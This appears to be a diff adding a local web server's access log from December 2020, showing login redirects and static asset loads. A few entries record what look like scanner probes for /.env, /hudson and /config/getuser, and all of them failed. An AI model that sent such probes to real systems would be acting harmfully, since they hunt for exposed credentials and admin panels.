+127.0.0.1 - - [09/Dec/2020 08:57:49] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 08:57:50] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:57:51] "GET /static/content/bootstrap.min.css HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:57:55] "GET /static/scripts/modernizr-2.6.2.js HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:57:56] "GET /static/content/site.css HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:57:56] "GET /static/scripts/jquery-1.10.2.js HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:57:57] "GET /static/scripts/bootstrap.js HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:57:57] "GET /static/scripts/respond.js HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:58:01] "GET /static/images/sign-in-with-ms.svg HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 08:58:02] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [09/Dec/2020 09:12:07] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 09:25:32] "GET /hudson HTTP/1.1" 404 -
+127.0.0.1 - - [09/Dec/2020 09:35:28] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 10:27:06] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 10:27:06] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 11:04:24] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 11:16:26] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 11:25:04] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 12:17:44] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 12:34:50] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 12:34:50] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 12:35:51] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 12:38:44] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 13:01:08] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 13:01:09] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 13:02:06] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 13:02:06] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 13:10:10] "GET /.env HTTP/1.1" 404 -
+127.0.0.1 - - [09/Dec/2020 13:10:10] "POST / HTTP/1.1" 405 -
+127.0.0.1 - - [09/Dec/2020 14:00:18] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 14:00:19] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 14:27:30] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 14:27:31] "GET /login?next=%2F HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 14:59:51] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 14:59:52] "GET /static/content/bootstrap.min.css HTTP/1.1" 304 -
+127.0.0.1 - - [09/Dec/2020 14:59:53] "GET /static/content/site.css HTTP/1.1" 304 -
+127.0.0.1 - - [09/Dec/2020 14:59:55] "GET /static/scripts/modernizr-2.6.2.js HTTP/1.1" 304 -
+127.0.0.1 - - [09/Dec/2020 14:59:56] "GET /static/images/sign-in-with-ms.svg HTTP/1.1" 304 -
+127.0.0.1 - - [09/Dec/2020 14:59:57] "GET /static/scripts/jquery-1.10.2.js HTTP/1.1" 304 -
+127.0.0.1 - - [09/Dec/2020 14:59:58] "GET /static/scripts/bootstrap.js HTTP/1.1" 304 -
+127.0.0.1 - - [09/Dec/2020 14:59:59] "GET /static/scripts/respond.js HTTP/1.1" 304 -
+127.0.0.1 - - [09/Dec/2020 15:29:36] "GET / HTTP/1.1" 302 -
+127.0.0.1 - - [09/Dec/2020 15:57:33] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 16:08:49] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 16:12:04] "GET /login HTTP/1.1" 200 -
+127.0.0.1 - - [09/Dec/2020 16:59:03] "GET /config/getuser?index=0 HTTP/1.1" 404 -
